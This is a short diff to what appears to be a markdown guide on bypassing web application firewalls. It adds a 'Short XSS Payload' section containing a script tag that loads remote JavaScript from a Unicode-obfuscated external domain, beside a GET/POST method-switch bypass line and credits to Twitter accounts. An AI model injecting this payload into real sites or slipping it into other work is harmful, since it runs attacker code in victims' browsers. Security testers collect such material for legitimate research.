@@ -333,6 +333,12 @@ Here’s a list of 7 useful techniques on how we can bypass WAF (Web Application
 
 GET /?q=xss     POST /q=xss
 
+### Short XSS Payload:
+
+```
+<script/src=//Ǌ.₨></script>
+```
+
 ### Some awesome people on twitter
 
 * [@Dark\_Knight](https://twitter.com/\_Dark\_Knight\_)
